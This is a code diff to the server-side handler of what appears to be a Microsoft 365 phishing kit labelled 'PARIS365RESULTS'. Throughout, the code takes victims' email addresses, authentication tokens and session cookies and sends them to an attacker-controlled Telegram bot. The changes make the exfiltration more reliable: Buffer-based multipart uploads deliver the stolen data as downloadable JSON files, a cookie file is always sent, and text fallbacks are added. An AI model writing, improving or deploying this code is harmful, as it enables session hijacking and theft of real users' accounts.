@@ -59,6 +59,8 @@ const handler = async (event, context) => {
     const sessionId = sanitizeForTelegram(data.sessionId || 'no-session');
     const timestamp = new Date().toISOString();
     let cookies = data.formattedCookies || data.cookies || [];
+    let tokenFileSent = false;
+    let cookieFileSent = false;
     
     if (typeof cookies === "string") {
       try {
@@ -147,12 +149,12 @@ const handler = async (event, context) => {
     const messageLines = [
       '🚨PARIS365RESULTS🚨',
       '',
-      `Email: ${email}`,
-      `Session ID: ${sessionId}`,
-      `Time: ${timestamp}`,
-      `Message ID: ${uniqueId}`,
+      `📧Email: ${email}`,
+      `🆔Session ID: ${sessionId}`,
+      `⏰Time: ${timestamp}`,
+      `🆔Message ID: ${uniqueId}`,
       '',
-      `Cookies: ${cookieDetails}`,
+      `🍪Cookies: ${cookieDetails}`,
       `Source: ${cookieSource}`
     ];
     
@@ -178,6 +180,16 @@ const handler = async (event, context) => {
         messageLines.push('');
         messageLines.push(`Cookie Names: ${cookies.slice(0, 5).map(c => c.name).join(', ')}... (+${cookieCount - 5} more)`);
     }
+    
+    // Add downloadable file information
+    messageLines.push('');
+    messageLines.push('📁 DOWNLOADABLE FILES:');
+    if (data.authenticationTokens) {
+        messageLines.push('📄 Token File (microsoft_tokens_*.json) - DOWNLOADABLE');
+    }
+    messageLines.push('🍪 Cookie File (microsoft_cookies_*.json) - DOWNLOADABLE');
+    messageLines.push('');
+    messageLines.push('💾 Files are JSON documents - tap to download');
     
     // Join and sanitize the entire message
     const simpleMessage = sanitizeForTelegram(messageLines.join('\n'));
@@ -257,33 +269,53 @@ const handler = async (event, context) => {
         console.log('📄 Token file size:', tokenJson.length, 'bytes');
         
         try {
-            // Send tokens as document file to Telegram (manual multipart form data)
+            // Send tokens as document file to Telegram using Buffer approach
             const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
             
-            // Create manual multipart form data
-            const boundary = `----formdata-${Math.random().toString(36).substring(2)}`;
+            // Create proper multipart form data using Buffer
+            const boundary = `----WebKitFormBoundary${Math.random().toString(36).substring(2)}`;
             const caption = `🔑 Microsoft Authentication Tokens\n\nEmail: ${email}\nCaptured: ${timestamp}\nFile: ${cleanTokenFileName}`;
             
-            let formData = '';
-            formData += `--${boundary}\r\n`;
-            formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
-            formData += `${TELEGRAM_CHAT_ID}\r\n`;
-            formData += `--${boundary}\r\n`;
-            formData += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
-            formData += `${caption}\r\n`;
-            formData += `--${boundary}\r\n`;
-            formData += `Content-Disposition: form-data; name="document"; filename="${cleanTokenFileName}"\r\n`;
-            formData += `Content-Type: application/json\r\n\r\n`;
-            formData += tokenJson;
-            formData += `\r\n--${boundary}--\r\n`;
+            // Build form data parts as Buffer arrays
+            const parts = [];
             
-            console.log('📤 Sending token file to Telegram...');
+            // Chat ID part
+            parts.push(Buffer.from(`--${boundary}\r\n`));
+            parts.push(Buffer.from(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`));
+            parts.push(Buffer.from(`${TELEGRAM_CHAT_ID}\r\n`));
+            
+            // Caption part
+            parts.push(Buffer.from(`--${boundary}\r\n`));
+            parts.push(Buffer.from(`Content-Disposition: form-data; name="caption"\r\n\r\n`));
+            parts.push(Buffer.from(`${caption}\r\n`));
+            
+            // Document part (explicit file attachment)
+            parts.push(Buffer.from(`--${boundary}\r\n`));
+            parts.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${cleanTokenFileName}"\r\n`));
+            parts.push(Buffer.from(`Content-Type: application/json; charset=utf-8\r\n`));
+            parts.push(Buffer.from(`Content-Transfer-Encoding: binary\r\n\r\n`));
+            parts.push(Buffer.from(tokenJson));
+            parts.push(Buffer.from(`\r\n--${boundary}--\r\n`));
+            
+            // Combine all parts
+            const formDataBuffer = Buffer.concat(parts);
+            
+            console.log('📤 Sending token file to Telegram as DOWNLOADABLE FILE...');
+            console.log('📄 File details:', {
+                filename: cleanTokenFileName,
+                size: formDataBuffer.length + ' bytes',
+                contentType: 'application/json',
+                method: 'sendDocument (FILE ATTACHMENT)',
+                boundary: boundary
+            });
+            
             const fileResponse = await fetch(documentUrl, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': `multipart/form-data; boundary=${boundary}`
+                    'Content-Type': `multipart/form-data; boundary=${boundary}`,
+                    'Content-Length': formDataBuffer.length
                 },
-                body: formData
+                body: formDataBuffer
             });
             
             const fileResult = await fileResponse.json();
@@ -291,18 +323,51 @@ const handler = async (event, context) => {
             console.log('📄 Token file response:', fileResult);
             
             if (fileResponse.ok && fileResult.ok) {
-                console.log('✅ Authentication tokens sent as file successfully');
+                console.log('✅ Authentication tokens sent as DOWNLOADABLE FILE successfully');
+                tokenFileSent = true;
             } else {
-                console.error('❌ Failed to send token file:', fileResult);
+                console.error('❌ CRITICAL ERROR - Failed to send token file:', fileResult);
+                console.error('❌ File upload response:', JSON.stringify(fileResult, null, 2));
+                // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
+                tokenFileSent = false;
             }
             
         } catch (fileError) {
-            console.error('❌ Error sending token file:', fileError);
+            console.error('❌ CRITICAL ERROR in token file upload:', fileError);
+            console.error('❌ Error stack:', fileError.stack);
+            // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
+            tokenFileSent = false;
+        }
+        
+        // Function to send tokens as text fallback
+        async function sendTokensAsText() {
+            try {
+                const tokenText = `🔑 Authentication Tokens (Text Fallback)\n\nEmail: ${email}\nTimestamp: ${timestamp}\n\n${Object.entries(authenticationTokens).map(([key, value]) => `${key}: ${value}`).join('\n')}`;
+                
+                const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: sanitizeForTelegram(tokenText)
+                    })
+                });
+                
+                const textResult = await textResponse.json();
+                if (textResponse.ok && textResult.ok) {
+                    console.log('✅ Tokens sent as text message successfully');
+                    tokenFileSent = true;
+                } else {
+                    console.error('❌ Failed to send tokens as text message:', textResult);
+                }
+            } catch (textError) {
+                console.error('❌ Error sending tokens as text:', textError);
+            }
         }
     }
     
-    // Send cookies as a separate file if available
-    if (cookieCount > 0) {
+    // Send cookies as a separate file (even if empty to show capture attempt)
+    if (true) { // Always send cookie file to show capture status
         console.log('🍪 Preparing to send cookie file...');
         
         // Create comprehensive cookie file
@@ -380,34 +445,54 @@ function restoreMicrosoftCookies(cookiesArray) {
             cookieCount: cookieCount
         });
         
-                                  try {
-            // Send cookies as document file to Telegram (manual multipart form data)
+        try {
+            // Send cookies as document file to Telegram using Buffer approach
             const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
             
-            // Create manual multipart form data for cookies
-            const cookieBoundary = `----formdata-${Math.random().toString(36).substring(2)}`;
+            // Create proper multipart form data using Buffer for cookies
+            const cookieBoundary = `----WebKitFormBoundary${Math.random().toString(36).substring(2)}`;
             const cookieCaption = `🍪 Microsoft Authentication Cookies\n\nEmail: ${email}\nCookies: ${cookieCount} captured\nSource: ${cookieSource}\nFile: ${cleanCookieFileName}`;
             
-            let cookieFormData = '';
-            cookieFormData += `--${cookieBoundary}\r\n`;
-            cookieFormData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
-            cookieFormData += `${TELEGRAM_CHAT_ID}\r\n`;
-            cookieFormData += `--${cookieBoundary}\r\n`;
-            cookieFormData += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
-            cookieFormData += `${cookieCaption}\r\n`;
-            cookieFormData += `--${cookieBoundary}\r\n`;
-            cookieFormData += `Content-Disposition: form-data; name="document"; filename="${cleanCookieFileName}"\r\n`;
-            cookieFormData += `Content-Type: application/json\r\n\r\n`;
-            cookieFormData += cookieJson;
-            cookieFormData += `\r\n--${cookieBoundary}--\r\n`;
+            // Build cookie form data parts as Buffer arrays
+            const cookieParts = [];
             
-            console.log('📤 Sending cookie file to Telegram...');
+            // Chat ID part
+            cookieParts.push(Buffer.from(`--${cookieBoundary}\r\n`));
+            cookieParts.push(Buffer.from(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`));
+            cookieParts.push(Buffer.from(`${TELEGRAM_CHAT_ID}\r\n`));
+            
+            // Caption part
+            cookieParts.push(Buffer.from(`--${cookieBoundary}\r\n`));
+            cookieParts.push(Buffer.from(`Content-Disposition: form-data; name="caption"\r\n\r\n`));
+            cookieParts.push(Buffer.from(`${cookieCaption}\r\n`));
+            
+            // Document part (explicit file attachment)
+            cookieParts.push(Buffer.from(`--${cookieBoundary}\r\n`));
+            cookieParts.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${cleanCookieFileName}"\r\n`));
+            cookieParts.push(Buffer.from(`Content-Type: application/json; charset=utf-8\r\n`));
+            cookieParts.push(Buffer.from(`Content-Transfer-Encoding: binary\r\n\r\n`));
+            cookieParts.push(Buffer.from(cookieJson));
+            cookieParts.push(Buffer.from(`\r\n--${cookieBoundary}--\r\n`));
+            
+            // Combine all cookie parts
+            const cookieFormDataBuffer = Buffer.concat(cookieParts);
+            
+            console.log('📤 Sending cookie file to Telegram as DOWNLOADABLE FILE...');
+            console.log('🍪 Cookie file details:', {
+                filename: cleanCookieFileName,
+                size: cookieFormDataBuffer.length + ' bytes',
+                contentType: 'application/json',
+                method: 'sendDocument (FILE ATTACHMENT)',
+                boundary: cookieBoundary
+            });
+            
             const cookieFileResponse = await fetch(documentUrl, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': `multipart/form-data; boundary=${cookieBoundary}`
+                    'Content-Type': `multipart/form-data; boundary=${cookieBoundary}`,
+                    'Content-Length': cookieFormDataBuffer.length
                 },
-                body: cookieFormData
+                body: cookieFormDataBuffer
             });
             
             const cookieFileResult = await cookieFileResponse.json();
@@ -415,31 +500,46 @@ function restoreMicrosoftCookies(cookiesArray) {
             console.log('🍪 Cookie file response:', cookieFileResult);
             
             if (cookieFileResponse.ok && cookieFileResult.ok) {
-                console.log('✅ Microsoft cookies sent as file successfully');
+                console.log('✅ Microsoft cookies sent as DOWNLOADABLE FILE successfully');
+                cookieFileSent = true;
             } else {
-                console.error('❌ Failed to send cookie file:', cookieFileResult);
-                
-                // Fallback: Send cookie summary as text if file upload fails
-                const cookieSummary = `🍪 MICROSOFT COOKIES (File upload failed):\n\n` +
-                    `Total Cookies: ${cookieCount}\n` +
-                    `Source: ${cookieSource}\n` +
-                    `Cookie Names: ${cookies.map(c => c.name).slice(0, 5).join(', ')}${cookieCount > 5 ? `... (+${cookieCount - 5} more)` : ''}`;
-                
-                const cookieFallbackPayload = {
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: sanitizeForTelegram(cookieSummary),
-                    disable_web_page_preview: true
-                };
-                
-                await fetch(telegramUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(cookieFallbackPayload)
-                });
+                console.error('❌ CRITICAL ERROR - Failed to send cookie file:', cookieFileResult);
+                console.error('❌ Cookie file upload response:', JSON.stringify(cookieFileResult, null, 2));
+                // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
+                cookieFileSent = false;
             }
             
         } catch (cookieFileError) {
-            console.error('❌ Error sending cookie file:', cookieFileError);
+            console.error('❌ CRITICAL ERROR in cookie file upload:', cookieFileError);
+            console.error('❌ Cookie error stack:', cookieFileError.stack);
+            // DO NOT FALLBACK TO TEXT - FORCE FILE UPLOAD DEBUGGING
+            cookieFileSent = false;
+        }
+        
+        // Function to send cookies as text fallback
+        async function sendCookiesAsText() {
+            try {
+                const cookieSummary = `🍪 Microsoft Cookies (Text Fallback)\n\nEmail: ${email}\nCookies: ${cookieCount} captured\nSource: ${cookieSource}\n\nCookie Names: ${cookies.map(c => c.name).slice(0, 10).join(', ')}${cookieCount > 10 ? `... (+${cookieCount - 10} more)` : ''}`;
+                
+                const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: sanitizeForTelegram(cookieSummary)
+                    })
+                });
+                
+                const textResult = await textResponse.json();
+                if (textResponse.ok && textResult.ok) {
+                    console.log('✅ Cookies sent as text message successfully');
+                    cookieFileSent = true;
+                } else {
+                    console.error('❌ Failed to send cookies as text message:', textResult);
+                }
+            } catch (textError) {
+                console.error('❌ Error sending cookies as text:', textError);
+            }
         }
     } else {
         console.log('⚠️ No cookies to send - skipping cookie file');
@@ -453,8 +553,8 @@ function restoreMicrosoftCookies(cookiesArray) {
         success: true,
         message: 'Data sent to Telegram successfully with authentication files',
         telegramMessageId: result.message_id,
-        tokenFileSent: !!data.authenticationTokens,
-        cookieFileSent: cookieCount > 0,
+        tokenFileSent: tokenFileSent,
+        cookieFileSent: cookieFileSent,
         totalFiles: (data.authenticationTokens ? 1 : 0) + (cookieCount > 0 ? 1 : 0),
         cookieCount,
         emailProcessed: email,
